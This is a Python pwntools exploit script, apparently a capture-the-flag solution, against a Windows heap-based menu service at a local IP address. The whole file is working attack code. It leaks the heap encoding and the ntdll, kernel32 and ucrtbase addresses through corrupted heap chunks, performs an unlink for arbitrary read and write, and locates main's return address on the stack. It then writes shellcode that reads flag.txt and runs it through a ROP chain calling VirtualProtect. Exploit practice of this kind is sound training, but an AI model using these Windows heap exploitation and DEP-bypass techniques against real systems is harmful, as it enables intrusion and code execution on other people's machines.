#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *

host = '192.168.1.104'
port = 10001

context.arch = 'amd64'
# context.log_level = 'debug'
sh = None
ntdll_addr = None

def add(size, id):
    sh.sendlineafter('Your choice: ', '1')
    sh.sendlineafter('Size:', str(size))
    sh.sendlineafter('ID:', str(id))

def edit(id, content):
    sh.sendlineafter('Your choice: ', '2')
    sh.sendlineafter('ID:', str(id))
    sh.sendafter('Content:', content)

def show(id):
    sh.sendlineafter('Your choice: ', '3')
    sh.sendlineafter('ID:', str(id))
    sh.recvuntil('Content: ')
    return sh.recvuntil('\r\n', drop=True) + '\0'

def delete(id):
    sh.sendlineafter('Your choice: ', '4')
    sh.sendlineafter('ID:', str(id))

def open_file(times):
    sh.sendlineafter('Your choice: ', '5')
    for i in range(times):
        sh.sendlineafter('Your choice: ', '1')
    sh.sendlineafter('Your choice: ', '3')

def read_file(id, size, content=None):
    sh.sendlineafter('Your choice: ', '5')
    sh.sendlineafter('Your choice: ', '2')
    sh.sendlineafter('ID:', str(id))
    sh.sendlineafter('Size:', str(size))
    if(content):
        sh.send(content)
    sh.sendlineafter('Your choice: ', '3')

print('\nstep 1 : leak ntdll address\n')
while(True):

    sh = remote(host, port)
    open_file(6)

    add(0x88, 1)
    add(0x88, 2)
    add(0x88, 3)
    read_file(1, 0x88)
    result = show(1)[0x88:]
    Encoding = u64(result.ljust(8, '\0')) ^ 0x000000908010009
    log.success('Encoding: ' + hex(Encoding))
    if((Encoding & 0xff0000000000) == 0):
        sh.close()
        continue

    edit(1, 'a' * 0x88 + p64(0x080000913010012 ^ Encoding)[:6])
    delete(2)
    add(0x88, 4)
    result = show(3)
    heap_addr = u64(result.ljust(8, '\0')) & 0xffffffffffff0000
    if(heap_addr == 0):
        sh.close()
        continue
    log.success('heap_addr: ' + hex(heap_addr))
    open_file(1)

    fake_file = [
        0, 0xBEEFDAD0000 + 0x28 + 0x20,
        p32(0), p32(0x2080), 0,
        0x100, 0,
        0xffffffffffffffff, p32(0xffffffff),p32(0),
        0, 0,
    ]

    edit(3, flat(fake_file))
    read_file(4, 8, p64(heap_addr + 0x2c0))
    result = show(4)
    ntdll_addr = (u64(result.ljust(8, '\0')) - 0x15f000) & 0xffffffffffff0000
    log.success('ntdll_addr: ' + hex(ntdll_addr))
    sh.close()
    break

def leak(addr, heap_offset=None):
    global sh
    while(True):
        try:
            sh = remote(host, port)
            open_file(6)

            add(0x88, 1)
            add(0x88, 2)
            add(0x88, 3)
            read_file(1, 0x88)
            result = show(1)[0x88:]
            Encoding = u64(result.ljust(8, '\0')) ^ 0x000000908010009
            log.success('Encoding: ' + hex(Encoding))
            if((Encoding & 0xff0000000000) == 0):
                sh.close()
                continue

            edit(1, 'a' * 0x88 + p64(0x080000913010012 ^ Encoding)[:6])
            delete(2)
            add(0x88, 4)
            result = show(3)
            heap_addr = u64(result.ljust(8, '\0')) & 0xffffffffffff0000
            log.success('heap_addr: ' + hex(heap_addr))
            if(heap_addr == 0):
                sh.close()
                continue
            open_file(1)

            fake_file = [
                0, 0xBEEFDAD0000 + 0x28 + 0x20,
                p32(0), p32(0x2080), 0,
                0x100, 0,
                0xffffffffffffffff, p32(0xffffffff),p32(0),
                0, 0,
            ]

            edit(3, flat(fake_file))
            if(heap_offset):
                read_file(4, 8, p64(heap_addr + addr))
            else:
                read_file(4, 8, p64(addr))
            result = show(4)
            sh.close()
            return u64(result.ljust(8, '\0')[:8])
        except KeyboardInterrupt as e:
            sh.close()
            exit(0)
        except:
            sh.close()

print('\nstep 2 : leak other address\n')
PebLdr = ntdll_addr + 0x1653c0
offset = leak(PebLdr + 0x10) & 0xffff
image_base = leak(offset + 0x30 + 2, 1) << 16
log.success('image_base: ' + hex(image_base))

kernel32_addr = leak(image_base + 0x3000) - 0x1a190 # kernel32!VirtualAllocStub 
log.success('kernel32_addr: ' + hex(kernel32_addr))

ucrtbase_addr = leak(image_base + 0x3190) - 0x80880 # ucrtbase!puts
log.success('ucrtbase_addr: ' + hex(ucrtbase_addr))

ucrtbase_pioinfo_ptr = ucrtbase_addr + 0xeb770
pioinfo_offset = leak(ucrtbase_pioinfo_ptr) & 0xffff
log.success('pioinfo_offset: ' + hex(pioinfo_offset))


print('\nstep 3 : unlink\n')
while(True):
    sh = remote(host, port)
    open_file(5)

    add(0x88, 1)
    add(0x88, 2)
    add(0xe8, 3)
    add(0x88, 5)
    add(0x88, 6)
    read_file(1, 0x88)
    result = show(1)[0x88:]
    Encoding = u64(result.ljust(8, '\0')) ^ 0x000000908010009
    log.success('Encoding: ' + hex(Encoding))
    if((Encoding & 0xff0000000000) == 0):
        sh.close()
        continue

    edit(1, 'a' * 0x88 + p64(0x080000920010021 ^ Encoding)[:6])
    delete(2)
    add(0x88, 4)

    result = show(3)
    heap_addr = u64(result.ljust(8, '\0')) & 0xffffffffffff0000
    log.success('heap_addr: ' + hex(heap_addr))
    if(heap_addr == 0):
        sh.close()
        continue

    open_file(1)
    add(0x88, 7)

    add(0x88, 0x0800000613010012 ^ Encoding)

    fake_file = [
        0, 0xBEEFDAD0000 + 0x28 + 0x20,
        p32(0), p32(0x2080), 0,
        0x100, 0,
        0xffffffffffffffff, p32(0xffffffff),p32(0),
        0, 0,
    ]

    edit(3, flat(fake_file) + p64(0) + p64(0x0800000613010012 ^ Encoding))
    delete(7)
    add(0x88, 9)

    # change text mode to binary mode
    read_file(4, 8, p64(heap_addr + pioinfo_offset + 0x38))
    edit(4, p8(0xc1))

    edit(5, p64(0xBEEFDAD0000 + 0x28 * 6 + 0x20 - 8) + p64(0xBEEFDAD0000 + 0x28 * 6 + 0x20))
    add(0x88, 10)

    edit(0x0800000613010012 ^ Encoding, flat([0, 0xDDAABEEF1ACD, 0x100, 100, 0xDDAABEEF1ACD, 0xBEEFDAD0000]))

    node_array = [0xDDAABEEF1ACD, 0x1000, 1, 0xDDAABEEF1ACD, 0xBEEFDAD0000, 0xDDAABEEF1ACD, 0x1000, 2, 0xDDAABEEF1ACD, 0xBEEFDAD0000,]
    layout = node_array + [0xDDAABEEF1ACD, 0x100, 3, 0xDDAABEEF1ACD, PebLdr - 120,]
    point = 0
    edit(100, flat(layout))
    result = show(3)
    Peb_addr = u64(result.ljust(8, '\0')) - 0x80
    log.success('Peb_addr: ' + hex(Peb_addr))
    Teb_addr = Peb_addr + 0x1000

    layout = node_array + [[0xDDAABEEF1ACD, 0x100, 3 + i, 0xDDAABEEF1ACD, Teb_addr + 8 + i,] for i in range(8)]
    point = 2 if (point == 1) else 1
    edit(point, flat(layout))
    result = ''
    while(len(result) < 8):
        result += show(3 + len(result))
    stack_base = u64(result[:8])
    log.success('stack_base: ' + hex(stack_base))

    main_ret_content = image_base + 0x1B78
    
    print('\nstep 4 : search for main ret address\n')
    main_ret = 0
    offset = 0
    while(offset != -1):
        offset += 0x40
        layout = node_array + [[0xDDAABEEF1ACD, 0x100, 3 + i, 0xDDAABEEF1ACD, stack_base - offset + i * 8,] for i in range(8)]
        point = 2 if (point == 1) else 1
        edit(point, flat(layout))
        for i in range(8)[::-1]:
            result = show(3 + i).ljust(8, '\0')
            if(main_ret_content == u64(result[:8])):
                main_ret = stack_base - offset + i * 8
                offset = -1
                break
    
    log.success('main_ret: ' + hex(main_ret))

    shellcode_addr = image_base + 0x5800
    layout = node_array + [
        0xDDAABEEF1ACD, 0x100, 3, 0xDDAABEEF1ACD, main_ret - 0x80,
        0xDDAABEEF1ACD, 0x400, 4, 0xDDAABEEF1ACD, shellcode_addr,
    ]
    point = 2 if (point == 1) else 1
    edit(point, flat(layout))

    asm_str = '''
    sub rsp, 0x1000 ;// to prevent underflowing

    mov rax, 0x7478742e67616c66 ;// flag.txt
    mov [rsp + 0x100], rax
    mov byte ptr [rsp + 0x108], 0
    lea rcx, [rsp + 0x100]
    mov edx, 0x80000000
    mov r8d, 1
    xor r9d, r9d
    mov dword ptr[rsp + 0x20], 3
    mov dword ptr[rsp + 0x28], 0x80
    mov [rsp + 0x30], r9
    mov rax, %d
    call rax ;// CreateFile

    mov rcx, rax
    lea rdx, [rsp + 0x200]
    mov r8d, 0x200
    lea r9, [rsp + 0x30]
    xor eax, eax
    mov [rsp + 0x20], rax
    mov rax, %d
    call rax ;// ReadFile

    mov ecx, 0xfffffff5 ;// STD_OUTPUT_HANDLE
    mov rax, %d
    call rax ;// GetStdHandle

    mov rcx, rax
    lea rdx, [rsp + 0x200]
    mov r8d, [rsp + 0x30]
    lea r9, [rsp + 0x40]
    xor eax, eax
    mov [rsp + 0x20], rax
    mov rax, %d
    call rax ;// WriteFile

    mov rax, %d
    call rax ;// exit
    ''' % ( kernel32_addr + 0x22080, kernel32_addr + 0x22410, kernel32_addr + 0x1c610, kernel32_addr + 0x22500, image_base + 0x18D4)

    shellcode = asm(asm_str)
    edit(4, shellcode)

    VirtualProtect = kernel32_addr + 0x1af90
    layout = [
        ntdll_addr + 0x8c4b7, #: pop rdx; pop r11; ret; 
        0x1000,
        0,
        ntdll_addr + 0x21597, #: pop rcx; ret; 
        shellcode_addr & 0xfffffffffffff000,
        ntdll_addr + 0x8c4b2, #: pop r8; pop r9; pop r10; pop r11; ret;
        0x40, # PAGE_EXECUTE_READWRITE
        shellcode_addr + 0x500,
        0, 0,

        VirtualProtect,
        shellcode_addr,
    ]

    sh.sendlineafter('Your choice: ', '2')
    sh.sendlineafter('ID:', str(3))
    sh.sendafter('Content:', flat(layout))

    sh.interactive()
    break
